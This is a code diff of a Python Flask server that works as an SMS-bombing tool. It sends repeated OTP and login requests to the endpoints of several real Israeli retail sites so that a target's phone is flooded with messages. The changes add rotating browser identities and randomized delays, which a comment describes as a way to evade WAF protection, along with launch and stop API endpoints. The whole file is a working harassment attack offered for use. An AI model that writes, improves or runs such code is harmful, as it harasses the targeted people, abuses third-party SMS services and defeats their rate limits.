@@ -84,15 +84,27 @@ import requests
 import random
 import time
 import os
+from datetime import datetime
 from flask import Flask, jsonify, request
 from flask_cors import CORS
 
+# --- הגדרות צבעים לטרמינל ---
+class Colors:
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    CYAN = '\033[96m'
+    BOLD = '\033[1m'
+    RESET = '\033[0m'
+
 app = Flask(__name__)
-CORS(app)
+CORS(app) # מאפשר ל-Lovable לתקשר עם השרת
 
-# הגדרות מטח
-BURST_PER_SITE = 10
+# --- הגדרות מערכת ---
+BURST_PER_SITE = 10  # כמות סמסים מכל אתר
+is_attacking = False # דגל שליטה (Kill Switch)
 
+# --- רשימת אתרים מעודכנת (טרף קל) ---
 SITES = [
     {"name": "Naot",       "url": "https://www.tevanaot.co.il/apps/api/otp/request", "type": "json", "body": {"phoneNumber": "{phone}"}},
     {"name": "CrazyLine",  "url": "https://www.crazyline.com/customer/ajax/post/", "type": "form", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}"},
@@ -100,72 +112,115 @@ SITES = [
     {"name": "Spices",     "url": "https://www.spicesonline.co.il/wp-admin/admin-ajax.php", "type": "form", "body": "action=validate_user_by_sms&phone={phone}"},
     {"name": "Urbanica",   "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "form", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}"},
     {"name": "Femina",     "url": "https://femina.co.il/apps/feminaapp/auth/send-code", "type": "json", "body": {"phone": "{phone}"}},
+    {"name": "Paneco",     "url": "https://www.paneco.co.il/customer/account/loginPost/", "type": "form", "body": "login[username]={phone}"},
 ]
 
-def get_headers(site_url):
+def get_dynamic_headers(site_url):
+    """מייצר זהות דפדפן ייחודית לכל בקשה"""
+    user_agents = [
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+    ]
+    
+    base_domain = site_url.rsplit('/', 3)[0]
     return {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
-        "Accept": "*/*",
+        "User-Agent": random.choice(user_agents),
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8",
         "X-Requested-With": "XMLHttpRequest",
-        "Referer": site_url.rsplit('/', 1)[0],
-        "Origin": site_url.rsplit('/', 3)[0]
+        "Origin": base_domain,
+        "Referer": base_domain + "/",
+        "Cache-Control": "no-cache"
     }
 
-def execute_smart_burst(site, phone):
-    """שולח 10 סמסים בצורה חכמה: שימוש ב-Session והשהיות מיקרו"""
+def log(msg, color=Colors.RESET):
+    ts = datetime.now().strftime("%H:%M:%S")
+    print(f"{color}[{ts}] {msg}{Colors.RESET}")
+
+def execute_ultra_burst(site, phone):
+    """מנגנון השליחה המתוחכם לכל אתר"""
+    global is_attacking
     success_count = 0
-    # שימוש ב-Session שומר על חיבור פתוח (Keep-Alive) ועל קוקיז, מה שגורם לזה לעבוד טוב יותר
-    session = requests.Session()
-    headers = get_headers(site["url"])
+    session = requests.Session() # שימוש ב-Session לכל אתר לשמירת Cookies
     
     for i in range(BURST_PER_SITE):
+        if not is_attacking:
+            log(f"🛑 Stopping burst for {site['name']}...", Colors.YELLOW)
+            break
+            
         try:
+            headers = get_dynamic_headers(site["url"])
+            
             if site["type"] == "json":
                 headers["Content-Type"] = "application/json"
                 payload = {k: v.replace("{phone}", phone) if isinstance(v, str) else v for k, v in site["body"].items()}
-                resp = session.post(site["url"], json=payload, headers=headers, timeout=5)
+                resp = session.post(site["url"], json=payload, headers=headers, timeout=10)
             else:
                 headers["Content-Type"] = "application/x-www-form-urlencoded"
                 payload = site["body"].replace("{phone}", phone)
-                resp = session.post(site["url"], data=payload, headers=headers, timeout=5)
+                resp = session.post(site["url"], data=payload, headers=headers, timeout=10)
 
-            if resp.status_code in (200, 201, 202):
+            if resp.status_code in (200, 201, 202, 204):
                 success_count += 1
-                print(f"[+] {site['name']} - SMS {i+1} Sent")
+                log(f"🔥 {site['name']:12} | SMS {i+1}/{BURST_PER_SITE} SENT", Colors.GREEN)
             else:
-                print(f"[-] {site['name']} - Blocked at {i+1} (Status: {resp.status_code})")
-                # אם האתר חסם אותנו (למשל 429), אין טעם להמשיך לאותו אתר
-                if resp.status_code == 429: break 
+                log(f"⚠️ {site['name']:12} | SMS {i+1} BLOCKED ({resp.status_code})", Colors.YELLOW)
+                if resp.status_code == 429: # Rate Limit
+                    time.sleep(3) 
 
-            # השהיית מיקרו - זה הסוד. 0.4 עד 0.9 שניות. 
-            # זה מהיר מאוד אבל עובר את רוב ההגנות הפשוטות.
-            time.sleep(random.uniform(0.4, 0.9))
+            # השהיית מיקרו חכמה לעקיפת WAF
+            time.sleep(random.uniform(1.2, 1.9))
 
         except Exception as e:
-            print(f"[!] {site['name']} Error: {e}")
-            break
+            log(f"❌ {site['name']:12} | Error: {str(e)[:30]}", Colors.RED)
+            time.sleep(2)
             
     return success_count
 
+# --- API Endpoints ---
+
+@app.route('/stop', methods=['POST'])
+def stop():
+    global is_attacking
+    is_attacking = False
+    log("!!! EMERGENCY STOP TRIGGERED BY USER !!!", Colors.RED)
+    return jsonify({"status": "stopped", "message": "Attack termination signal sent"})
+
 @app.route('/launch', methods=['POST'])
 def launch():
+    global is_attacking
     data = request.get_json() or {}
     phone = data.get('phone')
 
     if not phone:
-        return jsonify({"error": "No phone"}), 400
+        return jsonify({"error": "No phone number provided"}), 400
 
-    print(f"\n--- STARTING SMART BURST ON {phone} ---\n")
+    is_attacking = True
+    total_sites = len(SITES)
+    expected_sms = total_sites * BURST_PER_SITE
 
-    total_sent = 0
-    # מפעילים כל אתר ב-Thread נפרד. בתוך כל Thread יש לולאה של 10.
-    with concurrent.futures.ThreadPoolExecutor(max_workers=len(SITES)) as executor:
-        results = list(executor.map(lambda s: execute_smart_burst(s, phone), SITES))
-        total_sent = sum(results)
+    log(f"--- STARTING ULTRA BURST: {expected_sms} SMS ON {phone} ---", Colors.CYAN)
 
-    print(f"\n--- COMPLETED: {total_sent} SMS SENT ---")
-    return jsonify({"status": "success", "total_sent": total_sent})
+    total_success = 0
+    # שימוש ב-4 עובדים כדי לא להציף את ה-CPU ולשמור על יציבות
+    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
+        results = list(executor.map(lambda s: execute_ultra_burst(s, phone), SITES))
+        total_success = sum(results)
+
+    is_attacking = False
+    log(f"--- ATTACK COMPLETED: {total_success}/{expected_sms} SUCCESSFUL ---", Colors.CYAN)
+    
+    return jsonify({
+        "status": "completed",
+        "phone": phone,
+        "sent": total_success,
+        "total_attempted": expected_sms
+    })
 
 if __name__ == '__main__':
+    # מותאם להרצה על Render או מקומית
     port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port)
+    log(f"ZUNAMI ENGINE v20 READY ON PORT {port}", Colors.BOLD + Colors.GREEN)
+    app.run(host='0.0.0.0', port=port, debug=False)
